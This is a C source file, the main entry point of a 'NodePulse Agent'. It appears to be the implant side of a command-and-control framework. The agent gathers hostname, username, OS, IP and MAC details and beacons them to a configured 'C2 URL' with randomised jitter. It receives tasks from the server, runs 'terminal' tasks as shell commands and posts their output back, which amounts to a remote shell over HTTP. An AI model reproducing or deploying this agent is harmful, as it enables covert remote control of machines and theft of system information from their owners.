/*
 * NodePulse Agent - Main Entry Point
 *
 * Refactored with:
 * - Proper JSON parsing
 * - Safe string operations
 * - Input validation
 * - Improved error handling
 */

#include "config.h"
#include "platform/platform.h"
#include "modules/modules.h"
#include "utils/json.h"
#include "utils/safe_string.h"
#include "utils/validation.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <stdarg.h>

#ifdef _WIN32
#include <windows.h>
#include <processthreadsapi.h>
#else
#include <unistd.h>
#endif

/* ============================================================================
 * Global State
 * ============================================================================ */

static AgentConfig g_config;
static int g_running = 1;
static FILE* g_logfile = NULL;

/* ============================================================================
 * Logging
 * ============================================================================ */

static void log_init(void) {
#ifdef NODEPULSE_ENABLE_LOGGING
    char logpath[512];
#if defined(_WIN32) || defined(_WIN64)
    const char* temp = getenv("TEMP");
    if (!temp) temp = getenv("TMP");
    if (!temp) temp = ".";
    safe_snprintf(logpath, sizeof(logpath), "%s\\nodepulse_agent.log", temp);
#else
    safe_snprintf(logpath, sizeof(logpath), "/tmp/nodepulse_agent.log");
#endif
    g_logfile = fopen(logpath, "a");
    if (g_logfile) {
        fprintf(g_logfile, "\n=== Agent Started ===\n");
        fflush(g_logfile);
    }
#endif
}

static void log_msg(const char* fmt, ...) {
#ifdef NODEPULSE_ENABLE_LOGGING
    if (!g_logfile) return;
    time_t now = time(NULL);
    char timebuf[32];
    strftime(timebuf, sizeof(timebuf), "%Y-%m-%d %H:%M:%S", localtime(&now));
    fprintf(g_logfile, "[%s] ", timebuf);
    va_list args;
    va_start(args, fmt);
    vfprintf(g_logfile, fmt, args);
    va_end(args);
    fprintf(g_logfile, "\n");
    fflush(g_logfile);
#else
    (void)fmt;
#endif
}

static void log_cleanup(void) {
#ifdef NODEPULSE_ENABLE_LOGGING
    if (g_logfile) {
        log_msg("Agent shutting down");
        fclose(g_logfile);
        g_logfile = NULL;
    }
#endif
}

/* ============================================================================
 * JSON Payload Building
 * ============================================================================ */

static char* build_beacon_payload(void) {
    char hostname[256] = {0};
    char username[256] = {0};
    char os_info[256] = {0};
    char arch_info[64] = {0};
    char internal_ip[64] = {0};
    char mac_address[32] = {0};

    get_hostname(hostname, sizeof(hostname));
    get_username(username, sizeof(username));
    get_os_info(os_info, sizeof(os_info));
    get_arch_info(arch_info, sizeof(arch_info));
    get_internal_ip(internal_ip, sizeof(internal_ip));
    get_mac_address(mac_address, sizeof(mac_address));

    /* Build JSON using the proper JSON builder */
    JsonValue* payload = json_object();
    if (!payload) {
        return NULL;
    }

    json_object_set_string(payload, "device_id", g_config.agent_id);
    json_object_set_string(payload, "hostname", hostname);

#if defined(_WIN32) || defined(_WIN64)
    json_object_set_string(payload, "os_type", "windows");
#elif defined(__APPLE__)
    json_object_set_string(payload, "os_type", "macos");
#else
    json_object_set_string(payload, "os_type", "linux");
#endif

    json_object_set_string(payload, "os_version", os_info);
    json_object_set_string(payload, "architecture", arch_info);
    json_object_set_string(payload, "internal_ip", internal_ip);
    json_object_set_string(payload, "mac_address", mac_address);

    /* Get full system info from sysinfo module */
    char* sysinfo_json = NULL;
    Module* sysinfo_mod = module_get("systemInfo");
    if (sysinfo_mod && sysinfo_mod->execute) {
        sysinfo_mod->execute("gather", NULL, &sysinfo_json);
    }

    if (sysinfo_json && strlen(sysinfo_json) > 2) {
        const char* error = NULL;
        JsonValue* sysinfo = json_parse(sysinfo_json, &error);
        if (sysinfo) {
            json_object_set(payload, "system_info", sysinfo);
        } else {
            /* Fallback to basic info */
            JsonValue* basic_info = json_object();
            json_object_set_string(basic_info, "username", username);
            json_object_set(payload, "system_info", basic_info);
        }
        free(sysinfo_json);
    } else {
        JsonValue* basic_info = json_object();
        json_object_set_string(basic_info, "username", username);
        json_object_set(payload, "system_info", basic_info);
        if (sysinfo_json) free(sysinfo_json);
    }

    json_object_set_string(payload, "agent_key", g_config.comm_key);

    char* result = json_stringify(payload);
    json_free(payload);

    return result;
}

static char* build_task_result_payload(const char* task_id, int exit_code, const char* output) {
    JsonValue* result = json_object();
    if (!result) {
        return NULL;
    }

    json_object_set_string(result, "task_id", task_id);
    json_object_set_string(result, "device_id", g_config.agent_id);
    json_object_set_int(result, "exit_code", exit_code);
    json_object_set_string(result, "stdout", output ? output : "");
    json_object_set_string(result, "agent_key", g_config.comm_key);

    char* json_str = json_stringify(result);
    json_free(result);

    return json_str;
}

/* ============================================================================
 * Task Processing
 * ============================================================================ */

static void send_task_result(const char* task_id, int exit_code, const char* output) {
    if (!task_id || strlen(task_id) == 0) {
        return;
    }

    /* Build result URL */
    char result_url[512];
    char base_url[512];
    safe_strcpy(base_url, g_config.c2_url, sizeof(base_url));

    /* Remove the beacon endpoint to get base URL */
    char* beacon_suffix = strstr(base_url, "/functions/v1/agent-beacon");
    if (beacon_suffix) {
        *beacon_suffix = '\0';
    } else {
        beacon_suffix = strstr(base_url, "/agent-beacon");
        if (beacon_suffix) *beacon_suffix = '\0';
    }

    safe_snprintf(result_url, sizeof(result_url), "%s/functions/v1/task-result", base_url);

    /* Build result payload */
    char* result_payload = build_task_result_payload(task_id, exit_code, output);
    if (!result_payload) {
        log_msg("Failed to build task result payload");
        return;
    }

    log_msg("Sending result to: %s", result_url);

    /* Build headers with x-agent-key */
    const char* headers[2];
    headers[0] = "x-agent-key";
    headers[1] = g_config.comm_key;

    HttpResponse response = {0};
    int result = http_post_with_headers(result_url, result_payload, strlen(result_payload),
                                        "application/json", headers, 2, &response);

    log_msg("Result submission: status=%d, http_code=%d", result, response.status_code);

    http_response_free(&response);
    free(result_payload);
}

static void process_task(JsonValue* task) {
    if (!task || json_get_type(task) != JSON_OBJECT) {
        log_msg("Invalid task object");
        return;
    }

    /* Extract task fields using proper JSON parsing */
    const char* task_type = json_object_get_string(task, "task_type");
    const char* command = json_object_get_string(task, "command");
    const char* task_id = json_object_get_string(task, "id");

    if (!task_type || !task_id) {
        log_msg("Task missing required fields (task_type or id)");
        return;
    }

    log_msg("Task ID: %s, Type: %s, Command: %s",
            task_id, task_type, command ? command : "(none)");

    /* Validate task_id format */
    if (validate_uuid(task_id) != VALIDATION_OK) {
        log_msg("Invalid task ID format");
        return;
    }

    /* Execute based on task type */
    char* output = NULL;
    int exit_code = 0;

    if (strcmp(task_type, "terminal") == 0) {
        /* Validate command before execution */
        if (!command) {
            output = safe_strdup("{\"error\":\"No command provided\"}");
            exit_code = -1;
        } else {
            ValidationResult vr = validate_command(command, 4096);
            if (vr != VALIDATION_OK) {
                log_msg("Command validation failed: %s", validation_error_message(vr));
                output = safe_strdup("{\"error\":\"Invalid command\"}");
                exit_code = -1;
            } else {
                exit_code = run_command(command, &output, NULL);
                log_msg("Command exit code: %d", exit_code);
            }
        }
    } else if (strcmp(task_type, "custom") == 0) {
        /* Parse module:command from the command string */
        if (!command) {
            output = safe_strdup("{\"error\":\"No command provided\"}");
        } else {
            char module_name[64] = {0};
            const char* colon = strchr(command, ':');
            if (colon) {
                size_t module_len = (size_t)(colon - command);
                if (module_len < sizeof(module_name)) {
                    safe_strcpy(module_name, command, module_len + 1);
                    module_name[module_len] = '\0';
                    const char* module_cmd = colon + 1;
                    log_msg("Custom task: module=%s, cmd=%s", module_name, module_cmd);
                    module_execute(module_name, module_cmd, NULL, &output);
                } else {
                    output = safe_strdup("{\"error\":\"Module name too long\"}");
                }
            } else {
                output = safe_strdup("{\"error\":\"Invalid custom command format, expected module:command\"}");
            }
        }
    } else {
        /* Use module system for other types */
        module_execute(task_type, command ? command : "", NULL, &output);
    }

    /* Send result back */
    send_task_result(task_id, exit_code, output);

    if (output) free(output);
}

static int process_beacon_response(const char* response_data) {
    if (!response_data) {
        return 0;
    }

    log_msg("Processing beacon response");

    const char* error = NULL;
    JsonValue* response = json_parse(response_data, &error);
    if (!response) {
        log_msg("Failed to parse beacon response: %s", error ? error : "unknown error");
        return 0;
    }

    /* Get tasks array */
    JsonValue* tasks = json_object_get(response, "tasks");
    if (!tasks || json_get_type(tasks) != JSON_ARRAY) {
        log_msg("No tasks array in response");
        json_free(response);
        return 0;
    }

    size_t task_count = json_array_length(tasks);
    log_msg("Found %zu tasks", task_count);

    for (size_t i = 0; i < task_count; i++) {
        JsonValue* task = json_array_get(tasks, i);
        process_task(task);
    }

    json_free(response);
    return task_count > 0 ? 1 : 0;
}

/* ============================================================================
 * Beacon Loop
 * ============================================================================ */

static void beacon_loop(void) {
    log_msg("Starting beacon loop");
    log_msg("C2 URL: %s", g_config.c2_url);
    log_msg("Agent ID: %s", g_config.agent_id);
    log_msg("Sync interval: %d (100ms units), Jitter: %d%%",
            g_config.sync_interval, g_config.jitter_percent);

    /* Validate configuration */
    size_t key_len = strlen(g_config.comm_key);
    if (key_len == 0) {
        log_msg("WARNING: Comm key is EMPTY - authentication will fail!");
    } else {
        log_msg("Comm key length: %zu", key_len);
    }

    /* Build headers array */
    const char* headers[2];
    headers[0] = "x-agent-key";
    headers[1] = g_config.comm_key;

    int last_had_tasks = 0;

    while (g_running) {
        /* Build and send beacon */
        char* payload = build_beacon_payload();
        if (!payload) {
            log_msg("Failed to build beacon payload");
            platform_sleep(1000);
            continue;
        }

        log_msg("Sending beacon");

        HttpResponse response = {0};
        int result = http_post_with_headers(g_config.c2_url, payload, strlen(payload),
                                            "application/json", headers, 2, &response);

        log_msg("Beacon result: %d, HTTP status: %d", result, response.status_code);

        int has_tasks = 0;

        if (result == 0 && response.status_code == 200 && response.data) {
            has_tasks = process_beacon_response(response.data);
        } else if (response.data) {
            log_msg("Beacon error response: %s", response.data);
        }

        free(payload);
        http_response_free(&response);

        /* Adaptive beaconing */
        int base_sleep;
        if (has_tasks || last_had_tasks) {
            /* Fast mode when tasks are active */
            base_sleep = 100;
        } else {
            /* Normal mode: configured interval */
            base_sleep = g_config.sync_interval * 100;
            if (base_sleep < 100) base_sleep = 100;
            if (base_sleep > 10000) base_sleep = 10000;
        }

        /* Apply jitter */
        int jitter = (base_sleep * g_config.jitter_percent) / 100;
        int actual_sleep = base_sleep;
        if (jitter > 0) {
            actual_sleep = base_sleep + (rand() % (jitter * 2 + 1)) - jitter;
        }
        if (actual_sleep < 50) actual_sleep = 50;

        log_msg("Sleeping for %d ms", actual_sleep);
        last_had_tasks = has_tasks;

        platform_sleep(actual_sleep);
    }
}

/* ============================================================================
 * Main Entry Point
 * ============================================================================ */

int main(int argc, char* argv[]) {
    (void)argc; (void)argv;

    /* Initialize logging first */
    log_init();
    log_msg("NodePulse Agent initializing");

    /* Initialize configuration */
    config_init(&g_config);
    log_msg("Config loaded - Agent ID: %s", g_config.agent_id);

    /* Validate configuration */
    if (validate_url(g_config.c2_url, 1024) != VALIDATION_OK) {
        log_msg("Invalid C2 URL configuration");
        log_cleanup();
        return 1;
    }

    /* Seed random number generator with better entropy */
    unsigned int seed = (unsigned int)time(NULL);
    seed ^= (unsigned int)platform_time();
#ifdef _WIN32
    seed ^= (unsigned int)GetCurrentProcessId();
#else
    seed ^= (unsigned int)getpid();
#endif
    srand(seed);

    /* Initialize platform */
    if (platform_init() != 0) {
        log_msg("Platform init failed");
        log_cleanup();
        return 1;
    }
    log_msg("Platform initialized");

    /* Register enabled modules */
    modules_register_builtin(g_config.modules);
    log_msg("Modules registered: %s", g_config.modules);

    /* Initialize all modules */
    modules_init_all();
    log_msg("Modules initialized");

    /* Start beacon loop */
    beacon_loop();

    /* Cleanup */
    modules_cleanup_all();
    platform_cleanup();
    log_cleanup();

    return 0;
}
